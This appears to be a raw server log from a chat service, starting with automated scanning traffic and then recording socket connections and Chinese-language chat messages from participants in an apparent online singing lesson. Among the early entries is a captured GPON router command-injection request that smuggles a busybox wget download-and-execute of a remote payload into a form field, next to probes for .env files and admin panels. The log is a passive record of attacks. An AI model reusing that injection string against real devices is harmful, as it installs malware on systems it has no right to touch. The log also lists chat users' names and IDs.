[2021-04-25 00:17:37.420] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-25 01:36:03.328] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/owa/ 200 0ms
[2021-04-25 02:35:03.688] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/dns-query?dns=AAABAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB 200 0ms
[2021-04-25 02:35:04.762] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/dns-query {} 405 0ms
[2021-04-25 02:36:20.347] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-25 04:03:31.763] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-25 04:42:50.725] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/GponForm/diag_Form?style/ "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=$(busybox+wget+http://107.175.150.87/cache+-O+->+/dev/.p;sh+/dev/.p)&ipv=0\r\n" 405 0ms
[2021-04-25 04:50:27.288] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-25 05:11:12.295] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/dns-query?dns=AAABAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB 200 0ms
[2021-04-25 05:11:13.407] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/dns-query {} 405 1ms
[2021-04-25 05:16:24.260] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-25 05:47:48.248] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
[2021-04-25 07:27:18.692] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-25 07:32:16.598] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
[2021-04-25 07:43:01.638] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250//a2billing/customer/templates/default/footer.tpl 200 0ms
[2021-04-25 07:51:53.025] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250//a2billing/customer/templates/default/footer.tpl 200 1ms
[2021-04-25 07:57:17.392] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-25 08:00:51.925] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-25 08:08:54.977] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
[2021-04-25 08:08:56.190] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-25 08:15:42.609] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-25 08:29:10.878] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-25 08:29:11.692] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-25 08:29:35.130] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-25 08:44:52.800] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-25 08:45:23.407] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/robots.txt 200 1ms
[2021-04-25 08:45:24.860] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/sitemap.xml 200 0ms
[2021-04-25 08:45:26.479] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/.well-known/security.txt 200 0ms
[2021-04-25 08:45:30.696] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/favicon.ico 200 0ms
[2021-04-25 08:45:38.210] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
[2021-04-25 08:54:02.386] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
[2021-04-25 08:54:02.396] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/explicit_not_exist_path 200 0ms
[2021-04-25 08:54:02.487] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/admin/ 200 0ms
[2021-04-25 08:54:02.565] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/robots.txt 200 1ms
[2021-04-25 08:54:02.576] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/favicon.ico 200 0ms
[2021-04-25 08:54:02.690] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/login/img/product_logo.png 200 0ms
[2021-04-25 08:54:02.730] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/images/ofbiz.ico 200 1ms
[2021-04-25 08:54:02.771] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/phpMyAdmin/ 200 0ms
[2021-04-25 08:54:02.799] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/phpmyadmin/ 200 1ms
[2021-04-25 08:54:02.817] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/wcm/ 200 0ms
[2021-04-25 08:59:42.101] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-25 09:44:18.314] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-25 10:34:42.844] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-25 11:12:30.924] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
[2021-04-25 11:39:04.085] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-25 11:39:04.329] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/favicon.ico 200 0ms
[2021-04-25 11:39:05.941] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-25 11:54:25.350] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/.env 200 0ms
[2021-04-25 11:54:27.318] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/ {"0x":["androxgh0st"]} 405 0ms
[2021-04-25 12:51:30.327] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f 200 0ms
[2021-04-25 12:56:51.856] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f 200 1ms
[2021-04-25 14:00:01.647] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'd6c02917c5b54bf3abd909dd0c529f3c',
  username: '唐传声',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7dGnQ' }
[2021-04-25 14:00:01.648] [INFO] - [ '6Z_4w_Ee5vF_Lg-mADEo', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:00:01.679] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'd6c02917c5b54bf3abd909dd0c529f3c',
  username: '唐传声',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7dGn-' }
[2021-04-25 14:00:01.679] [INFO] - [ 'vmwyT-D0QFeQ7E-mADEp', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:00:02.719] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'c02238742a48480c8dd7e8a6e1deb6b6',
  username: '善良夫人wl',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7dGVa' }
[2021-04-25 14:00:02.719] [INFO] - [ 'gQ93CHgGeMTqhjIAADEq', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:00:09.546] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'a7c4651de48c44469fd4b1daa9fdcd72',
  username: '蓝天',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7dIPP' }
[2021-04-25 14:00:09.547] [INFO] - [ '3lT-PhBMckWw3PoUADEr', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:00:35.022] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'aaef6c66eec8406cb35cf0e9ca61d51d',
  username: 'mgy',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7dOOQ' }
[2021-04-25 14:00:35.022] [INFO] - [ '1ObwvOBfQPeGDc7pADEs', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:00:53.818] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '26fbf138dea44532ae3b8edc6d5e6c07',
  username: '顾众义',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7dSxi' }
[2021-04-25 14:00:53.818] [INFO] - [ '9Uh1Jey3_sFRJ_F3ADEt', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:00:56.528] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'ec63bb9606ef4ba0b64ecd32bd6e0b10',
  username: '王胜娥',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7dTa9' }
[2021-04-25 14:00:56.528] [INFO] - [ 'wSPoYlyE7JcCHEYXADEu', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:01:07.627] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '92c5691b971747cdb57a70bbb956c9ac',
  username: '小德兰',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7dW3x' }
[2021-04-25 14:01:07.627] [INFO] - [ 'CHRJL4YE6UdL_griADEv', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:01:10.023] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'e2ada79e16ac43579eda96a45867274d',
  username: '水晶',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7dWvq' }
[2021-04-25 14:01:10.024] [INFO] - [ 'cXZC8QzW4BRnDRqAADEw', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:01:14.094] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'ec63bb9606ef4ba0b64ecd32bd6e0b10',
  username: '王胜娥',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7dXsE' }
[2021-04-25 14:01:14.094] [INFO] - [ 'HTH_Rqx-h4MXNZR2ADEx', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:01:28.138] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'b1e963b4fa7049458b11fc9691d81940',
  username: '碎碎心塞塞',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7dbdX' }
[2021-04-25 14:01:28.138] [INFO] - [ 'bT7nr_DJBCK06TkgADEy', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:02:05.631] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'eb909a73018045f090d5466850f74e13',
  username: '耿升平',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7dlDy' }
[2021-04-25 14:02:05.631] [INFO] - [ 'm0t18x4cyiznLvvMADEz', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:02:12.175] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'f0a294952cf94db98c9edb946fd840b8',
  username: 'jane',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7dmCc' }
[2021-04-25 14:02:12.175] [INFO] - [ 'tRFOtcS04AoYQUBVADE0', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:02:41.329] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'b3847357deae4ade9be06e0a201c0543',
  username: '大小石头的妈',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7dtSF' }
[2021-04-25 14:02:41.330] [INFO] - [ 'QcgUJpDfEqe-B1lmADE1', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:02:56.807] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '4a61d7c8574746f3ba016775ff7213d8',
  username: '倪铁城',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7dx4p' }
[2021-04-25 14:02:56.807] [INFO] - [ 'qcAocJD2Lmz2yPpHADE2', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:03:20.592] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'd6c02917c5b54bf3abd909dd0c529f3c',
  username: '唐传声',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7e1Lp' }
[2021-04-25 14:03:20.592] [INFO] - [ 'K1IV8KyeXTb4B-j7ADE3', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:03:32.371] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '8c84c0e5397e41ffa58f1669173e21a5',
  username: '杨',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7e3e_' }
[2021-04-25 14:03:32.371] [INFO] - [ 'VryvNX6n-eGGaGUVADE4', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:03:42.044] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'd0a0829582ed473dbc67c1330451ff69',
  username: 'why3a3c449873',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7e5r7' }
[2021-04-25 14:03:42.045] [INFO] - [ 'jQZHKyXVbtVISUUpADE5', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:04:02.058] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'eb909a73018045f090d5466850f74e13',
  username: '耿升平',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7eBf2' }
[2021-04-25 14:04:02.058] [INFO] - [ 'JKSIHRKVRqUwFkn4ADE6', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:04:11.595] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'b3847357deae4ade9be06e0a201c0543',
  username: '大小石头的妈',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7eDVY' }
[2021-04-25 14:04:11.595] [INFO] - [ 'TfTzB9K_x2UrGWrnADE7', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:04:19.566] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'cb6d0fcfa9594d7c925b7f9f00c638d1',
  username: '美美',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7eF90' }
[2021-04-25 14:04:19.566] [INFO] - [ 'aZut6XKI5DnhVR-jADE8', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:04:21.325] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '8c84c0e5397e41ffa58f1669173e21a5',
  username: '杨',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7eFb-' }
[2021-04-25 14:04:21.327] [INFO] - [ 'YYSZtRrP1BGrq3AKADE9', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:04:24.589] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '60bcbfb463c941af8c186cfd0878654a',
  username: 'xiaoying',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7eGf5' }
[2021-04-25 14:04:24.589] [INFO] - [ '9YIAXexXvrSAgOs0ADE-', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:04:42.203] [INFO] - msg { role: 0,
  username: '善良夫人wl',
  _id: 'gQ93CHgGeMTqhjIAADEq',
  msg: '声音好听的' }
[2021-04-25 14:05:17.928] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '8c84c0e5397e41ffa58f1669173e21a5',
  username: '杨',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7eTQD' }
[2021-04-25 14:05:17.928] [INFO] - [ 'GKGlexX9AUW_QeuYADE_', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:05:32.058] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'b1e963b4fa7049458b11fc9691d81940',
  username: '碎碎心塞塞',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7eXGu' }
[2021-04-25 14:05:32.058] [INFO] - [ '9MKM7vZrV5ppd99zADFA', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:05:32.099] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'b3847357deae4ade9be06e0a201c0543',
  username: '大小石头的妈',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7eX8n' }
[2021-04-25 14:05:32.100] [INFO] - [ 'YqAHf3-GbF867z7jADFB', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:05:35.421] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'b3847357deae4ade9be06e0a201c0543',
  username: '大小石头的妈',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7eXzH' }
[2021-04-25 14:05:35.422] [INFO] - [ 'adJMcJA4rKqMADbTADFC', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:05:52.877] [INFO] - msg { role: 0,
  username: '善良夫人wl',
  _id: 'gQ93CHgGeMTqhjIAADEq',
  msg: '厚重，期待老师的点评' }
[2021-04-25 14:05:55.036] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '8c84c0e5397e41ffa58f1669173e21a5',
  username: '杨',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7ecU1' }
[2021-04-25 14:05:55.037] [INFO] - [ 'kmmk56QNJooW8TaoADFD', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:06:35.102] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '04a57ba3c32e45499b70860b39c98a6a',
  username: '许静芬',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7emh3' }
[2021-04-25 14:06:35.103] [INFO] - [ 'GOr3MUvH4BdHsn4jADFE', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:07:03.229] [INFO] - msg { role: 0,
  username: '杨',
  _id: 'kmmk56QNJooW8TaoADFD',
  msg: '谢谢声音问诊室' }
[2021-04-25 14:07:34.093] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'f51f7215e71e4cc08bccb57f69c8234b',
  username: '因因',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7e-bM' }
[2021-04-25 14:07:34.093] [INFO] - [ 'h0JMEl4lVQRgmOddADFF', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:07:39.629] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'c02238742a48480c8dd7e8a6e1deb6b6',
  username: '善良夫人wl',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7f01g' }
[2021-04-25 14:07:39.630] [INFO] - [ 'YE6gvIPXe2bxBUDWADFG', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:07:41.844] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '54df0ace363e43938e5b8e5c83c91736',
  username: '四方楠',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7f0rX' }
[2021-04-25 14:07:41.845] [INFO] - [ '0fi9mewtd4j_I9dVADFH', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:07:46.385] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '1c7371b7694c49758548814699a5ba62',
  username: '海洋',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7f1p8' }
[2021-04-25 14:07:46.386] [INFO] - [ 'F5pbseZ8Zv5llgFQADFI', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:08:16.141] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'd0a0829582ed473dbc67c1330451ff69',
  username: 'why3a3c449873',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7f8m7' }
[2021-04-25 14:08:16.141] [INFO] - [ 'XviABZap7FbQ-cltADFJ', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:08:27.188] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'aa221274f8f8453dbf675db8b7b13cf4',
  username: '芳芳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7fBgl' }
[2021-04-25 14:08:27.189] [INFO] - [ 'B5uo_GeiQaQVq6EPADFK', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:08:30.031] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'c02238742a48480c8dd7e8a6e1deb6b6',
  username: '善良夫人wl',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7fCLj' }
[2021-04-25 14:08:30.032] [INFO] - [ '1hpb2lpITZcHKU2jADFL', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:08:43.974] [INFO] - msg { role: 0,
  username: '杨',
  _id: 'kmmk56QNJooW8TaoADFD',
  msg: '五个共鸣刮用要用调节' }
[2021-04-25 14:09:07.744] [INFO] - msg { role: 0,
  username: '杨',
  _id: 'kmmk56QNJooW8TaoADFD',
  msg: '声音和气的融合' }
[2021-04-25 14:09:31.089] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '6aa9186bba864313985c85cfae757997',
  username: '翁幼奇',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7fRO1' }
[2021-04-25 14:09:31.090] [INFO] - [ 'eUzmNNYOIBbxrO9pADFM', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:09:50.394] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '6a6c0cc94224478e8eec8757e42c51a3',
  username: '梁军',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7fV-U' }
[2021-04-25 14:09:50.394] [INFO] - [ 'hz_PGnuvhhpayU6nADFN', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:10:27.839] [INFO] - msg { role: 0,
  username: '大小石头的妈',
  _id: 'adJMcJA4rKqMADbTADFC',
  msg: '认可' }
[2021-04-25 14:10:51.882] [INFO] - msg { role: 0,
  username: '杨',
  _id: 'kmmk56QNJooW8TaoADFD',
  msg: '唱歌用咽' }
[2021-04-25 14:11:37.374] [INFO] - msg { role: 0,
  username: '善良夫人wl',
  _id: '1hpb2lpITZcHKU2jADFL',
  msg: '说的太好了👍 👍 👍 ' }
[2021-04-25 14:11:38.207] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '1c7371b7694c49758548814699a5ba62',
  username: '海洋',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7fwMY' }
[2021-04-25 14:11:38.208] [INFO] - [ '4FkV_JqwIy7Jr6tiADFO', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:11:46.622] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '54df0ace363e43938e5b8e5c83c91736',
  username: '四方楠',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7fyc9' }
[2021-04-25 14:11:46.622] [INFO] - [ 'o1avAqQNoxCifVxrADFP', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:12:29.544] [INFO] - msg { role: 0,
  username: '顾众义',
  _id: '9Uh1Jey3_sFRJ_F3ADEt',
  msg: '把声音集中到共鸣腔' }
[2021-04-25 14:12:30.005] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'aa221274f8f8453dbf675db8b7b13cf4',
  username: '芳芳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7g4xd' }
[2021-04-25 14:12:30.006] [INFO] - [ '-JwuOs34JUDLiwvbADFQ', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:13:36.181] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '59227fe333ee418ca95d750543227321',
  username: '朱秀英',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7gNov' }
[2021-04-25 14:13:36.181] [INFO] - [ 'SRWzxW2fNQU0lHqjADFR', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:13:38.916] [INFO] - msg { role: 0,
  username: '大小石头的妈',
  _id: 'adJMcJA4rKqMADbTADFC',
  msg: '唱歌就是一个有控制的吐气的过程' }
[2021-04-25 14:13:51.950] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'b1e963b4fa7049458b11fc9691d81940',
  username: '碎碎心塞塞',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7gRFU' }
[2021-04-25 14:13:51.951] [INFO] - [ 'TVyxAu6f-OTPyWJnADFS', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:14:17.380] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'b1e963b4fa7049458b11fc9691d81940',
  username: '碎碎心塞塞',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7gXSI' }
[2021-04-25 14:14:17.380] [INFO] - [ 'nv_ouvUMGlQuu597ADFT', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:14:27.397] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '64aa143b78cc407483398906d4da2b83',
  username: '顾福龙',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7gZwn' }
[2021-04-25 14:14:27.397] [INFO] - [ 'T7O6wVoSZJcZ-BgIADFU', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:15:00.155] [INFO] - msg { role: 0,
  username: 'mgy',
  _id: '1ObwvOBfQPeGDc7pADEs',
  msg: '李老师教的好棒👍 👍 👍 ' }
[2021-04-25 14:15:13.088] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '802f7070d322497285b0217a293c573b',
  username: '笑笑',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7gks4' }
[2021-04-25 14:15:13.088] [INFO] - [ 'dmIKfNEOVuI2TlvjADFV', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:15:25.258] [INFO] - msg { role: 0,
  username: '大小石头的妈',
  _id: 'adJMcJA4rKqMADbTADFC',
  msg: '一个乐句一口气' }
[2021-04-25 14:16:21.428] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '6a6c0cc94224478e8eec8757e42c51a3',
  username: '梁军',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7g_SQ' }
[2021-04-25 14:16:21.428] [INFO] - [ '2x39V04Ifna1b6HYADFW', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:16:38.369] [INFO] - msg { role: 0,
  username: '大小石头的妈',
  _id: 'adJMcJA4rKqMADbTADFC',
  msg: '老师好幽默' }
[2021-04-25 14:16:47.860] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'd3895ef97d954417b5c32f00fe30a7f0',
  username: '戚年凤',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7h5Ui' }
[2021-04-25 14:16:47.860] [INFO] - [ '5uGXzmHkG2bLic2qADFX', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:17:03.078] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'a80e7770892c4dff98b30560c7ac7cae',
  username: '小云',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7h9or' }
[2021-04-25 14:17:03.078] [INFO] - [ 'mmfs0dcLYjimTSJ-ADFY', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:17:23.352] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'eb909a73018045f090d5466850f74e13',
  username: '耿升平',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7hFHN' }
[2021-04-25 14:17:23.352] [INFO] - [ 'ewQtw4p90t7tv2CZADFZ', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:18:30.076] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'aa221274f8f8453dbf675db8b7b13cf4',
  username: '芳芳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7hUpq' }
[2021-04-25 14:18:30.076] [INFO] - [ 'wf2pFNXdDvs--RDPADFa', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:19:07.185] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'aa221274f8f8453dbf675db8b7b13cf4',
  username: '芳芳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7hcrR' }
[2021-04-25 14:19:07.186] [INFO] - [ 'FwRGUYCJA04-CGaNADFb', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:19:25.076] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'aa221274f8f8453dbf675db8b7b13cf4',
  username: '芳芳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7hiKx' }
